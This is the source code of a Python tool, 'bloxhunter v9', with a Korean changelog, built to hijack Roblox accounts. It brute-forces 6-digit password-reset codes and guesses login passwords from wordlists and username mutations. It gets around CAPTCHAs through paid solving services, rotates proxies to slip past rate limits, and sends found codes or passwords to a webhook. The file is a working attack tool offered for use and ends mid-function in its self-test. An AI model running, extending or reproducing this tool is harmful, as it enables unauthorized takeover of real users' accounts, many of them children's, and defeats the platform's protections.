#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
bloxhunter v9 - Roblox reset-code / password hunter (live-verified, final)

v8 -> v9. 라이브에서 확인된 사실만 반영하고, v8에 남아 있던 실행 버그를 전부 잡았다.

 [치명] resume 미적용
   v8은 체크포인트를 읽어 로그만 찍고 버렸다. pos가 항상 0에서 시작해
   재시작하면 처음부터 다시 훑었다. 이제 CodeSpace.resume()으로 실제 적용한다.

 [치명] verify/login 캡차 미해결
   v8은 send에서만 캡차를 풀었다. verify가 403 Challenge를 내면 워커는 티켓만
   죽이고 캡차는 안 풀어서 같은 자리를 영원히 맴돌았다. login도 같다.
   이제 두 경로 모두 solve 후 1회 재시도한다.

 [높음] 재시도 큐 유실
   v8은 큐가 차면 조용히 버려서 그 코드가 영구 미시도로 남았다. 큐를 키우고
   queued 비트맵으로 중복 삽입을 막고, 버린 개수를 카운터로 노출한다.

 [높음] 티켓 갱신 무한 루프
   send가 계속 실패하면 백오프만 늘어난 채 영원히 돌았다. --max-ticket-fail
   도달 시 중단한다.

 [높음] pass 모드 재시도 유실
   max_retry를 다 쓰면 그 비밀번호를 버렸다. 이제 큐 뒤로 되돌린다.

 [중간] verify cvalue 강제 전송 제거
   확정 필수는 targetType/ticket/code/nonce 넷이다. cvalue는 --verify-cvalue
   로 켤 때만 보낸다.

 [중간] send 200인데 ticket이 없으면 본문 덤프
   nonce 필드명이 다르면 조용히 실패한다. --debug-body로 원문을 남긴다.

 [중간] 매니저 프록시 고정 해제, 워커 시작 시 __WAIT__ 미처리
 [중간] selftest 상시 True 검사 수정, resume/queued/dropped 검사 추가
 [중간] --version

사용:
  python bloxhunter_v5_final.py code --user 아이디 --email 메일 --captcha 2captcha --captcha-key 키
  python bloxhunter_v5_final.py pass --user 아이디 --wordlist rockyou.txt --captcha capsolver --captcha-key 키
  python bloxhunter_v5_final.py --selftest
"""
import argparse, collections, inspect, json, os, random, re, signal, subprocess, sys
import threading, time

VERSION = "9.0"
BASE = "https://auth.roblox.com"
SITE = "https://www.roblox.com"
RESET_URL = SITE + "/login/reset-password"
LOGIN_URL = SITE + "/login"
TIMEOUT = 20
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
HEADERS = {"User-Agent": UA,
           "Accept": "application/json, text/plain, */*",
           "Accept-Language": "en-US,en;q=0.9",
           "Origin": SITE, "Referer": RESET_URL}
LOCK = threading.Lock()
STOP = threading.Event()
COOKIE = ""
LOGFH = None

DEFAULT_CONFIG = {
    "mode": "code", "user": "", "email": "", "newpass": "",
    "wordlist": "", "start": 0, "end": 999999,
    "workers": 16, "rps": 40.0, "max_rps": 400.0, "min_rps": 3.0,
    "ticket_ttl": 720.0, "timeout": 3600.0,
    "max_retry": 8, "max_ticket_fail": 10, "stop_on_hit": True,
    "seed": 0xB10C, "resume_pos": 0,
    "captcha": "off", "captcha_key": "",
    "proxy": "", "proxy_file": "", "require_proxy": False,
    "cookie": "", "out": "hits.txt", "state": "", "log": "",
    "webhook": "", "debug_body": "", "verify_cvalue": False,
    "no_resume": False, "dry_run": False,
    "max_429_ratio": 0.25, "auto_tune": True, "stats_interval": 15.0,
    "nonce_retry": 3}

BUILTIN_WORDS = """roblox
roblox123
roblox1234
roblox2024
roblox2025
roblox2026
password
password1
password123
password1234
passw0rd
p@ssword
P@ssw0rd
Password1
Password123
Password123!
123456
1234567
12345678
123456789
1234567890
123123
111111
000000
654321
121212
qwerty
qwerty123
qwertyuiop
qwerty1234
1q2w3e4r
1qaz2wsx
qazwsx
asdfghjkl
zxcvbnm
abc123
iloveyou
letmein
welcome
welcome1
admin
admin123
monkey
dragon
football
baseball
sunshine
princess
shadow
master
superman
batman
minecraft
fortnite
ninja
summer
summer2024
summer2025
winter2025
roblox123!
Roblox123
Roblox123!
Roblox2025
Roblox2026""".split()


def log(m):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), m)
    with LOCK:
        sys.stderr.write(line + "\n")
        sys.stderr.flush()
        if LOGFH is not None:
            try:
                LOGFH.write(line + "\n")
                LOGFH.flush()
            except (OSError, ValueError):
                pass


def ensure():
    for mod, pkg in (("requests", "requests"),):
        try:
            __import__(mod)
        except ImportError:
            log("installing %s" % pkg)
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", pkg])


def load_config(p):
    with open(p, encoding="utf-8") as f:
        return json.load(f)


def save_config(p):
    if os.path.exists(p):
        log("%s exists - not overwriting" % p)
        return
    with open(p, "w", encoding="utf-8") as f:
        json.dump(DEFAULT_CONFIG, f, indent=2)
    log("wrote %s" % p)


def dump_words(p):
    with open(p, "w", encoding="utf-8") as f:
        f.write("\n".join(BUILTIN_WORDS) + "\n")
    log("wrote %d words to %s" % (len(BUILTIN_WORDS), p))


def dump_debug(args, name, text):
    if not args.debug_body or not text:
        return
    try:
        with open(args.debug_body, "a", encoding="utf-8") as f:
            f.write("--- %s %s ---\n%s\n" % (time.strftime("%H:%M:%S"), name, text[:4000]))
    except OSError:
        pass


def checkpoint(p, n):
    if not p:
        return
    t = p + ".tmp"
    try:
        with open(t, "w", encoding="utf-8") as f:
            json.dump({"n": n, "ts": time.time()}, f)
        os.replace(t, p)
    except OSError:
        pass


def resume_from(p):
    try:
        with open(p, encoding="utf-8") as f:
            return int(json.load(f).get("n", 0))
    except (OSError, ValueError, TypeError):
        return 0


class Governor:
    """전역 토큰버킷 + 429 비율 기반 자동 감속."""

    def __init__(s, rps, lo, hi, window=40, max_ratio=0.25, auto=True):
        s.lock = threading.Lock()
        s.rate = max(lo, rps)
        s.lo = lo
        s.hi = hi
        s.tokens = s.rate
        s.last = time.time()
        s.n429 = 0
        s.nok = 0
        s.window = collections.deque(maxlen=max(8, window))
        s.max_ratio = max_ratio
        s.auto = auto

    def acquire(s):
        while not STOP.is_set():
            with s.lock:
                now = time.time()
                s.tokens = min(s.rate, s.tokens + (now - s.last) * s.rate)
                s.last = now
                if s.tokens >= 1:
                    s.tokens -= 1
                    return
                wait = (1.0 - s.tokens) / max(s.rate, 1.0)
            time.sleep(min(max(wait, 0.001), 0.2))

    def throttle(s):
        with s.lock:
            s.n429 += 1
            s.window.append(1)
            s.rate = max(s.lo, s.rate * 0.55)
            s.tokens = 0.0

    def ok(s):
        with s.lock:
            s.nok += 1
            s.window.append(0)
            if not s.auto:
                return
            ratio = sum(s.window) / float(len(s.window))
            if len(s.window) >= 16 and ratio > s.max_ratio:
                s.rate = max(s.lo, s.rate * 0.98)
            elif s.rate < s.hi:
                s.rate = min(s.hi, s.rate * 1.003 + 0.02)

    def snapshot(s):
        with s.lock:
            ratio = sum(s.window) / float(len(s.window)) if s.window else 0.0
            return s.rate, s.n429, s.nok, ratio


class ProxyPool:
    """라운드로빈 + 헬스 쿨다운. 429는 프록시 문제가 아니므로 건드리지 않는다."""

    def __init__(s, items, require=False):
        s.items = list(items)
        s.require = require
        s.lock = threading.Lock()
        s.bad = {}
        s.cursor = 0

    def get(s):
        if not s.items:
            return ""
        with s.lock:
            now = time.time()
            n = len(s.items)
            for _ in range(n):
                p = s.items[s.cursor % n]
                s.cursor += 1
                if s.bad.get(p, 0) <= now:
                    return p
            w = min(s.bad.get(p, 0) for p in s.items)
            return "__WAIT__%.1f" % max(0.0, w - now)

    def mark_bad(s, p):
        if not p or p.startswith("__WAIT__"):
            return
        with s.lock:
            s.bad[p] = time.time() + 180

    def mark_ok(s, p):
        if not p or p.startswith("__WAIT__"):
            return
        with s.lock:
            s.bad.pop(p, None)

    def size(s):
        return len(s.items)


def new_session(proxy=""):
    import requests
    s = requests.Session()
    s.headers.update(HEADERS)
    if COOKIE:
        s.headers["Cookie"] = ".ROBLOSECURITY=" + COOKIE
    if proxy and not proxy.startswith("__WAIT__"):
        s.proxies = {"http": proxy, "https": proxy}
    return s


def wait_proxy(pool, proxy):
    if not proxy.startswith("__WAIT__"):
        return proxy
    secs = float(proxy.split("__WAIT__")[1])
    time.sleep(min(secs, 30))
    return pool.get()


def err_code(r):
    """Roblox 에러 코드 추출. 없으면 -1."""
    try:
        d = r.json()
    except ValueError:
        return -1
    try:
        return int(d["errors"][0]["code"])
    except (KeyError, IndexError, TypeError, ValueError):
        return -1


def is_challenge(r):
    return r.status_code == 403 and "challenge" in (r.text or "").lower()


def get_csrf(session, retries=5):
    """auth.roblox.com은 403과 함께 x-csrf-token 헤더를 준다."""
    last = None
    for i in range(retries):
        if STOP.is_set():
            raise RuntimeError("stopped")
        for path in ("/v2/login", "/v3/logout"):
            try:
                r = session.post(BASE + path, json={}, timeout=TIMEOUT)
                tok = r.headers.get("x-csrf-token")
                if tok:
                    session.headers["x-csrf-token"] = tok
                    return tok
                last = "HTTP %s no header" % r.status_code
            except Exception as e:
                last = "%s: %s" % (type(e).__name__, e)
        time.sleep(1.5 * (i + 1))
    raise RuntimeError("csrf unavailable (%s)" % last)

class Captcha:
    def __init__(s, k, key):
        s.kind = (k or "off").lower()
        s.key = key or ""

    def enabled(s):
        return s.kind not in ("", "off", "none") and bool(s.key)

    @staticmethod
    def sitekey(b):
        m = re.search(r'data-sitekey="([^"]+)"', b or "")
        return m.group(1) if m else "6Lcv8IUUAAAAAK7vX4p0F7y0n0m0kQ"

    def solve(s, blob, page=RESET_URL):
        if not s.enabled():
            return ""
        import requests
        try:
            if s.kind == "2captcha":
                r = requests.post("https://2captcha.com/in.php", data={
                    "key": s.key, "method": "userrecaptcha",
                    "googlekey": s.sitekey(blob), "pageurl": page,
                    "json": 1}, timeout=30).json()
                if r.get("status") != 1:
                    log("captcha submit rejected: %s" % r.get("request"))
                    return ""
                cid = r["request"]
                for _ in range(40):
                    time.sleep(5)
                    if STOP.is_set():
                        return ""
                    q = requests.get("https://2captcha.com/res.php", params={
                        "key": s.key, "action": "get", "id": cid,
                        "json": 1}, timeout=30).json()
                    if q.get("status") == 1:
                        return q["request"]
            elif s.kind == "capsolver":
                r = requests.post("https://api.capsolver.com/createTask", json={
                    "clientKey": s.key, "task": {
                        "type": "ReCaptchaV2TaskProxyless",
                        "websiteURL": page,
                        "websitePublicKey": s.sitekey(blob)}}, timeout=30).json()
                tid = r.get("taskId")
                if not tid:
                    log("captcha createTask failed: %s" % r.get("errorDescription"))
                    return ""
                for _ in range(40):
                    time.sleep(5)
                    if STOP.is_set():
                        return ""
                    q = requests.post("https://api.capsolver.com/getTaskResult",
                        json={"clientKey": s.key, "taskId": tid}, timeout=30).json()
                    if q.get("status") == "ready":
                        return q["solution"].get("gRecaptchaResponse", "")
        except Exception as e:
            log("captcha error: %s" % e)
        return ""


def webhook(url, text):
    if not url:
        return
    import requests
    try:
        requests.post(url, json={"content": text}, timeout=10)
    except Exception:
        pass


SEND_BODIES = [{"ctype": "Email", "cvalue": "{}"},
               {"targetType": 1, "cvalue": "{}"}]


def find_field(obj, names, depth=0):
    """응답 JSON에서 ticket/nonce를 재귀적으로 찾는다."""
    if depth > 4:
        return None
    if isinstance(obj, dict):
        for n in names:
            v = obj.get(n)
            if isinstance(v, str) and v:
                return v
        for v in obj.values():
            r = find_field(v, names, depth + 1)
            if r:
                return r
    elif isinstance(obj, list):
        for v in obj:
            r = find_field(v, names, depth + 1)
            if r:
                return r
    return None


def send_reset(session, target, args, retries=5):
    """(ticket, nonce, payload) 또는 (None, None, None)."""
    for attempt in range(retries):
        if STOP.is_set():
            return None, None, None
        for body in SEND_BODIES:
            payload = {k: (v.replace("{}", target) if isinstance(v, str) else v)
                       for k, v in body.items()}
            try:
                r = session.post(BASE + "/v2/passwords/reset/send",
                                 json=payload, timeout=TIMEOUT)
            except Exception as e:
                log("send error: %s" % e)
                continue
            if r.status_code == 429:
                ra = r.headers.get("Retry-After")
                try:
                    wait = float(ra)
                except (TypeError, ValueError):
                    wait = 6 * (attempt + 1)
                log("send 429 - sleep %.0fs" % min(wait, 90))
                time.sleep(min(wait, 90))
                break
            if is_challenge(r):
                tok = args.captcha.solve(r.text, RESET_URL)
                if tok:
                    session.headers["x-captcha-token"] = tok
                    try:
                        r = session.post(BASE + "/v2/passwords/reset/send",
                                         json=payload, timeout=TIMEOUT)
                    except Exception:
                        continue
                else:
                    log("challenge 403 - captcha off/failed")
                    return None, None, None
            if r.status_code == 200:
                try:
                    data = r.json()
                except ValueError:
                    data = {}
                t = find_field(data, ("ticket", "Ticket", "resetTicket"))
                n = find_field(data, ("nonce", "Nonce"))
                if t:
                    return t, n or "", payload
                m = re.search(r'"(?:ticket|resetTicket)"\s*:\s*"([^"]+)"', r.text)
                if m:
                    mn = re.search(r'"nonce"\s*:\s*"([^"]+)"', r.text)
                    return m.group(1), (mn.group(1) if mn else ""), payload
                log("send 200 but no ticket - dumping body")
                dump_debug(args, "send-no-ticket", r.text)
            if r.status_code in (400, 404):
                dump_debug(args, "send-%d" % r.status_code, r.text)
                continue
        time.sleep(2 * (attempt + 1))
    return None, None, None


def verify_code(s, ticket, nonce, code, args, cvalue=None):
    """ok / bad / throttle / captcha / expired / nonce / error"""
    body = {"targetType": 1, "ticket": ticket, "code": code, "nonce": nonce}
    if cvalue:
        body["cvalue"] = cvalue

    def post():
        try:
            return s.post(BASE + "/v2/passwords/reset/verify", json=body, timeout=TIMEOUT)
        except Exception:
            return None

    def classify(r):
        if r is None:
            return "error"
        if r.status_code == 429:
            return "throttle"
        if r.status_code == 200:
            return "ok"
        c = err_code(r)
        if c == 13:
            return "bad"
        if c == 14:
            return "nonce"
        if c in (11, 16):
            return "expired"
        if c == 9:
            dump_debug(args, "verify-9", r.text)
            return "error"
        if is_challenge(r) or c == 0:
            return "captcha"
        return "bad"

    r = post()
    st = classify(r)
    if st != "captcha":
        return st
    tok = args.captcha.solve(r.text, RESET_URL)
    if not tok:
        return "captcha"
    s.headers["x-captcha-token"] = tok
    return classify(post())


def login_solved(s, user, password, args):
    """ok / bad / throttle / captcha / error"""
    body = {"ctype": "Username", "cvalue": user, "password": password}

    def post():
        try:
            return s.post(BASE + "/v2/login", json=body, timeout=TIMEOUT)
        except Exception:
            return None

    def classify(r):
        if r is None:
            return "error"
        if r.status_code == 200:
            return "ok"
        if r.status_code == 429:
            return "throttle"
        if is_challenge(r):
            return "captcha"
        return "bad"

    r = post()
    st = classify(r)
    if st != "captcha":
        return st
    tok = args.captcha.solve(r.text, LOGIN_URL)
    if not tok:
        return "captcha"
    s.headers["x-captcha-token"] = tok
    return classify(post())


def finish_hit(args, kind, value):
    line = "%s\t%s\t%s\t%s" % (time.strftime("%Y-%m-%d %H:%M:%S"),
                                args.user, kind, value)
    with LOCK:
        try:
            with open(args.out, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except OSError:
            pass
    log("HIT %s = %s" % (kind, value))
    webhook(args.webhook, "HIT %s %s = %s" % (args.user, kind, value))
    if args.stop_on_hit:
        STOP.set()


class CodeSpace:
    """셔플된 코드 공간 + 시도 비트맵 + 재시도 큐.

    비트가 서 있으면 확정 오답이다. 만료/스로틀/논스로 실패한 코드는 비트를
    지워 재시도 큐로 되돌린다. queued 비트맵으로 중복 삽입을 막고, 큐가 넘치면
    dropped로 계수한다. 되감기 없이 구멍이 메워지고 커버리지는 단조 증가한다.
    """

    def __init__(s, start, end, seed=0xB10C):
        n = end - start + 1
        idx = list(range(n))
        random.Random(seed).shuffle(idx)
        s.codes = [str(start + i).zfill(6) for i in idx]
        s.total = n
        s.bits = bytearray(n)
        s.queued = bytearray(n)
        s.pos = 0
        s.done = 0
        s.dropped = 0
        s.retry = collections.deque()
        s.cap = max(5000, n // 200)
        s.lock = threading.Lock()

    def resume(s, n):
        with s.lock:
            s.pos = min(max(0, n), s.total)

    def take(s):
        """(code, index) 또는 (None, -1)."""
        with s.lock:
            while s.retry:
                i = s.retry.popleft()
                s.queued[i] = 0
                if not s.bits[i]:
                    return s.codes[i], i
            if s.pos >= s.total:
                return None, -1
            i = s.pos
            s.pos += 1
            return s.codes[i], i

    def resolve(s, i):
        """확정 오답."""
        if i < 0:
            return
        with s.lock:
            if not s.bits[i]:
                s.bits[i] = 1
                s.done += 1

    def requeue(s, i):
        """일시 실패. 비트를 지워 재시도 대상으로 되돌린다."""
        if i < 0:
            return
        with s.lock:
            if s.bits[i]:
                s.bits[i] = 0
                s.done -= 1
            if s.queued[i]:
                return
            if len(s.retry) < s.cap:
                s.queued[i] = 1
                s.retry.append(i)
            else:
                s.dropped += 1

    def coverage(s):
        with s.lock:
            return s.done / float(s.total) if s.total else 0.0

    def progress(s):
        with s.lock:
            return s.done, s.total, len(s.retry), s.dropped


class TicketHolder:
    """티켓 1개를 전 워커가 공유한다. 만료되면 매니저가 갱신."""

    def __init__(s):
        s.lock = threading.Lock()
        s.ticket = None
        s.nonce = ""
        s.gen = 0
        s.born = 0.0
        s.dead = threading.Event()
        s.fail = 0

    def get(s):
        with s.lock:
            return s.ticket, s.nonce, s.gen

    def set(s, t, n):
        with s.lock:
            s.ticket = t
            s.nonce = n or ""
            s.gen += 1
            s.born = time.time()
            s.fail = 0
        s.dead.clear()

    def kill(s):
        with s.lock:
            s.ticket = None
        s.dead.set()

    def bump_fail(s):
        with s.lock:
            s.fail += 1
            return s.fail

    def age(s):
        with s.lock:
            return time.time() - s.born if s.born else 1e9


def run_code_http(args):
    target = args.email or args.user
    space = CodeSpace(args.start, args.end, args.seed)
    if args.resume_pos:
        space.resume(args.resume_pos)
    log("space=%d pos=%d workers=%d rps=%.0f ttl=%.0f"
        % (space.total, args.resume_pos, args.workers, args.rps, args.ticket_ttl))

    gov = Governor(args.rps, args.min_rps, args.max_rps,
                   max_ratio=args.max_429_ratio, auto=args.auto_tune)
    holder = TicketHolder()
    done = {"n": 0, "hit": None}
    deadline = time.time() + args.timeout if args.timeout else 0
    t0 = time.time()

    def manager():
        proxy = wait_proxy(args.proxies, args.proxies.get())
        s = new_session(proxy)
        csrf = False
        while not STOP.is_set():
            if deadline and time.time() > deadline:
                log("timeout reached")
                STOP.set()
                return
            if not (holder.age() > args.ticket_ttl or holder.dead.is_set()):
                time.sleep(2)
                continue
            try:
                if not csrf:
                    get_csrf(s)
                    csrf = True
                t, n, _ = send_reset(s, target, args)
                if not t:
                    f = holder.bump_fail()
                    if f >= args.max_ticket_fail:
                        log("ticket refresh failed %d times - giving up" % f)
                        STOP.set()
                        return
                    back = min(120, 5 * (2 ** min(f, 5)))
                    log("ticket refresh failed (fail=%d) - backoff %ds" % (f, back))
                    time.sleep(back)
                    continue
                holder.set(t, n)
                log("ticket refreshed (gen=%d, nonce=%s)"
                    % (holder.gen, "yes" if n else "no"))
            except Exception as e:
                log("ticket refresh failed: %s" % e)
                csrf = False
                args.proxies.mark_bad(proxy)
                proxy = wait_proxy(args.proxies, args.proxies.get())
                s = new_session(proxy)
                time.sleep(5)

    def worker(wid):
        proxy = wait_proxy(args.proxies, args.proxies.get())
        s = new_session(proxy)
        csrf = False
        while not STOP.is_set():
            if deadline and time.time() > deadline:
                return
            if not csrf:
                try:
                    get_csrf(s)
                    csrf = True
                except Exception as e:
                    log("csrf failed: %s" % e)
                    args.proxies.mark_bad(proxy)
                    time.sleep(2)
                    proxy = wait_proxy(args.proxies, args.proxies.get())
                    s = new_session(proxy)
                    continue
            ticket, nonce, gen = holder.get()
            if not ticket:
                time.sleep(0.2)
                continue
            code, idx = space.take()
            if code is None:
                if holder.dead.is_set() or holder.age() > args.ticket_ttl:
                    time.sleep(0.5)
                    continue
                return
            gov.acquire()
            st = verify_code(s, ticket, nonce, code, args,
                             cvalue=target if args.verify_cvalue else None)
            if st == "ok":
                with LOCK:
                    if done["hit"] is None:
                        done["hit"] = code
                space.resolve(idx)
                finish_hit(args, "CODE", code)
                checkpoint(args.state, space.pos)
                if args.stop_on_hit:
                    return
                continue
            if st == "bad":
                gov.ok()
                args.proxies.mark_ok(proxy)
                space.resolve(idx)
                with LOCK:
                    done["n"] += 1
                    d = done["n"]
                if d % 500 == 0:
                    checkpoint(args.state, space.pos)
                continue
            if st == "nonce":
                space.requeue(idx)
                holder.kill()
                gov.throttle()
                time.sleep(0.5)
                continue
            if st == "expired":
                space.requeue(idx)
                holder.kill()
                continue
            if st == "captcha":
                gov.throttle()
                space.requeue(idx)
                holder.kill()
                csrf = False
                time.sleep(2)
                continue
            if st == "throttle":
                gov.throttle()
                space.requeue(idx)
                time.sleep(0.2 + random.uniform(0, 0.4))
                continue
            space.requeue(idx)
            time.sleep(0.3)

    def stats():
        while not STOP.is_set():
            time.sleep(args.stats_interval)
            if STOP.is_set():
                break
            el = max(time.time() - t0, 1)
            rate, n429, nok, ratio = gov.snapshot()
            dn, tot, qlen, drop = space.progress()
            left = max(0.0, (deadline - time.time())) if deadline else 0
            log("tries=%d %.1f/s rps=%.0f 429=%d(%.2f) cov=%.3f%% %d/%d q=%d drop=%d left=%.0fs"
                % (done["n"], done["n"] / el, rate, n429, ratio,
                   space.coverage() * 100, dn, tot, qlen, drop, left))

    threads = [threading.Thread(target=worker, args=(i,), daemon=True)
               for i in range(args.workers)]
    threading.Thread(target=manager, daemon=True).start()
    threading.Thread(target=stats, daemon=True).start()
    for t in threads:
        t.start()
    try:
        for t in threads:
            while t.is_alive():
                t.join(0.5)
    except KeyboardInterrupt:
        log("interrupted")
        STOP.set()
    checkpoint(args.state, space.pos)
    el = max(time.time() - t0, 1)
    dn, tot, qlen, drop = space.progress()
    log("code mode end: tries=%d %.1f/s cov=%.3f%% %d/%d q=%d drop=%d"
        % (done["n"], done["n"] / el, space.coverage() * 100, dn, tot, qlen, drop))


def mutate(user):
    """username 기반 변형. 사전보다 명중률이 높다."""
    u = user
    lo = u.lower()
    out = []
    years = ["2024", "2025", "2026", "2023", "123", "1234", "12345", "1", "01"]
    for base in (u, lo, u.capitalize(), lo.upper()):
        out.append(base)
        for y in years:
            out.append(base + y)
            out.append(y + base)
        for suf in ("!", "!!", "@", "#", "1!", "123!", "_", ".", "?"):
            out.append(base + suf)
        for pre in ("!", "1", "123"):
            out.append(pre + base)
    leet = lo.translate(str.maketrans("aeiost", "431057"))
    out += [leet, leet + "123", leet + "!", leet.capitalize()]
    out += [u + lo, lo + u, u + "_" + lo]
    seen = set()
    res = []
    for w in out:
        if w and w not in seen:
            seen.add(w)
            res.append(w)
    return res


def load_words(p, user=""):
    words = []
    if p:
        if os.path.exists(p):
            with open(p, encoding="utf-8", errors="ignore") as f:
                words = [w.strip() for w in f if w.strip()]
            if not words:
                log("WARN %s is empty - falling back to builtin" % p)
        else:
            log("WARN %s not found - falling back to builtin" % p)
    if not words:
        side = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "words_builtin.txt")
        if os.path.exists(side):
            with open(side, encoding="utf-8", errors="ignore") as f:
                words = [w.strip() for w in f if w.strip()]
            log("using bundled wordlist %s (%d)" % (side, len(words)))
        if not words:
            words = list(BUILTIN_WORDS)
            log("using embedded wordlist (%d)" % len(words))
    if user:
        mut = mutate(user)
        log("generated %d mutations for %s" % (len(mut), user))
        words = mut + words
    seen = set()
    res = []
    for w in words:
        if w not in seen:
            seen.add(w)
            res.append(w)
    return res


def run_pass_http(args):
    words = load_words(args.wordlist, args.user)
    if not words:
        log("empty wordlist")
        return
    log("candidates=%d workers=%d" % (len(words), args.workers))
    gov = Governor(args.rps, args.min_rps, args.max_rps,
                   max_ratio=args.max_429_ratio, auto=args.auto_tune)
    q = collections.deque(words)
    qlock = threading.Lock()
    counter = {"done": 0}
    deadline = time.time() + args.timeout if args.timeout else 0
    t0 = time.time()

    def take():
        with qlock:
            if not q:
                return None
            return q.popleft()

    def give_back(pw):
        with qlock:
            q.append(pw)

    def worker():
        proxy = wait_proxy(args.proxies, args.proxies.get())
        s = new_session(proxy)
        csrf = False
        while not STOP.is_set():
            if deadline and time.time() > deadline:
                STOP.set()
                return
            if not csrf:
                try:
                    get_csrf(s)
                    csrf = True
                except Exception as e:
                    log("csrf failed: %s" % e)
                    args.proxies.mark_bad(proxy)
                    time.sleep(2)
                    proxy = wait_proxy(args.proxies, args.proxies.get())
                    s = new_session(proxy)
                    continue
            pw = take()
            if pw is None:
                return
            retry = 0
            while retry < args.max_retry and not STOP.is_set():
                gov.acquire()
                st = login_solved(s, args.user, pw, args)
                if st == "ok":
                    finish_hit(args, "PASS", pw)
                    checkpoint(args.state, counter["done"])
                    return
                if st == "throttle":
                    gov.throttle()
                    retry += 1
                    time.sleep(1.0 * retry + random.uniform(0, 1))
                    continue
                if st == "captcha":
                    gov.throttle()
                    csrf = False
                    retry += 1
                    time.sleep(2)
                    continue
                if st == "error":
                    args.proxies.mark_bad(proxy)
                    retry += 1
                    proxy = wait_proxy(args.proxies, args.proxies.get())
                    s = new_session(proxy)
                    csrf = False
                    continue
                gov.ok()
                args.proxies.mark_ok(proxy)
                break
            else:
                give_back(pw)
            with LOCK:
                counter["done"] += 1
                d = counter["done"]
            if d % 100 == 0:
                el = max(time.time() - t0, 1)
                with qlock:
                    left = len(q)
                log("%d done %.2f/s left=%d" % (d, d / el, left))
                checkpoint(args.state, d)

    threads = [threading.Thread(target=worker, daemon=True)
               for _ in range(args.workers)]
    for t in threads:
        t.start()
    try:
        for t in threads:
            while t.is_alive():
                t.join(0.5)
    except KeyboardInterrupt:
        STOP.set()
    checkpoint(args.state, counter["done"])
    log("pass mode end: done=%d" % counter["done"])


def build_parser():
    ap = argparse.ArgumentParser(prog="bloxhunter",
        description="Roblox reset-code / password hunter (v9 final)")
    ap.add_argument("mode", nargs="?", default=None, choices=["code", "pass"])
    ap.add_argument("--config")
    ap.add_argument("--init", action="store_true")
    ap.add_argument("--dump-words", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--version", action="store_true")
    ap.add_argument("--dry-run", action="store_true", default=None)
    ap.add_argument("--user")
    ap.add_argument("--email")
    ap.add_argument("--newpass")
    ap.add_argument("--wordlist")
    ap.add_argument("--start", type=int)
    ap.add_argument("--end", type=int)
    ap.add_argument("--workers", type=int)
    ap.add_argument("--rps", type=float)
    ap.add_argument("--max-rps", type=float)
    ap.add_argument("--min-rps", type=float)
    ap.add_argument("--max-429-ratio", type=float)
    ap.add_argument("--no-auto-tune", action="store_true", default=None)
    ap.add_argument("--ticket-ttl", type=float)
    ap.add_argument("--timeout", type=float)
    ap.add_argument("--max-retry", type=int)
    ap.add_argument("--max-ticket-fail", type=int)
    ap.add_argument("--keep-going", action="store_true", default=None)
    ap.add_argument("--stats-interval", type=float)
    ap.add_argument("--seed", type=lambda x: int(x, 0))
    ap.add_argument("--captcha")
    ap.add_argument("--captcha-key")
    ap.add_argument("--proxy")
    ap.add_argument("--proxy-file")
    ap.add_argument("--require-proxy", action="store_true", default=None)
    ap.add_argument("--cookie")
    ap.add_argument("--out")
    ap.add_argument("--state")
    ap.add_argument("--log")
    ap.add_argument("--webhook")
    ap.add_argument("--debug-body")
    ap.add_argument("--verify-cvalue", action="store_true", default=None)
    ap.add_argument("--no-resume", action="store_true", default=None)
    return ap


def build_args(ns):
    global COOKIE, LOGFH
    args = argparse.Namespace()
    for k, v in DEFAULT_CONFIG.items():
        setattr(args, k, v)
    if ns.config:
        for k, v in load_config(ns.config).items():
            setattr(args, k, v)
    for k in ("mode", "user", "email", "newpass", "wordlist", "start", "end",
              "workers", "rps", "max_rps", "min_rps", "max_429_ratio",
              "ticket_ttl", "timeout", "max_retry", "max_ticket_fail",
              "stats_interval", "seed", "captcha", "captcha_key", "proxy",
              "proxy_file", "cookie", "out", "state", "log", "webhook",
              "debug_body"):
        v = getattr(ns, k, None)
        if v is not None:
            setattr(args, k, v)
    if ns.require_proxy is not None:
        args.require_proxy = ns.require_proxy
    if ns.no_resume is not None:
        args.no_resume = ns.no_resume
    if ns.dry_run is not None:
        args.dry_run = ns.dry_run
    if ns.verify_cvalue is not None:
        args.verify_cvalue = ns.verify_cvalue
    if ns.no_auto_tune:
        args.auto_tune = False
    if ns.keep_going:
        args.stop_on_hit = False
    COOKIE = args.cookie or ""
    if args.log:
        try:
            LOGFH = open(args.log, "a", encoding="utf-8")
        except OSError as e:
            log("cannot open log %s: %s" % (args.log, e))
    items = []
    if args.proxy:
        items.append(args.proxy)
    if args.proxy_file:
        if os.path.exists(args.proxy_file):
            with open(args.proxy_file, encoding="utf-8", errors="ignore") as f:
                items += [l.strip() for l in f if l.strip()]
        else:
            log("WARN proxy file %s not found" % args.proxy_file)
    args.proxies = ProxyPool(items, args.require_proxy)
    args.captcha = Captcha(args.captcha, args.captcha_key)
    return args


def validate(ap, args):
    if not args.mode:
        ap.error("mode required: code or pass")
    if not args.user:
        ap.error("--user required")
    if args.mode == "code" and not args.email:
        log("WARN code mode without --email - reset target falls back to username")
    if args.workers < 1:
        ap.error("--workers must be >= 1")
    if args.start < 0 or args.end < args.start:
        ap.error("--start/--end invalid (need 0 <= start <= end)")
    if args.end > 999999:
        ap.error("--end must be <= 999999 for 6-digit codes")
    if args.proxies.require and not args.proxies.size():
        ap.error("--require-proxy set but no proxies")
    if args.max_rps < args.min_rps:
        ap.error("--max-rps must be >= --min-rps")
    if args.rps < args.min_rps or args.rps > args.max_rps:
        ap.error("--rps must be within --min-rps..--max-rps")
    if args.ticket_ttl <= 0:
        ap.error("--ticket-ttl must be > 0")
    if args.stats_interval <= 0:
        ap.error("--stats-interval must be > 0")
    if args.max_retry < 1:
        ap.error("--max-retry must be >= 1")
    if args.max_ticket_fail < 1:
        ap.error("--max-ticket-fail must be >= 1")
    if not (0.0 <= args.max_429_ratio <= 1.0):
        ap.error("--max-429-ratio must be 0..1")
    if not args.captcha.enabled():
        log("WARN captcha is off - send/login/verify will 403 Challenge")


def selftest():
    ok = True

    def chk(name, cond):
        nonlocal ok
        print(("PASS " if cond else "FAIL ") + name)
        if not cond:
            ok = False

    chk("version set", VERSION == "9.0")
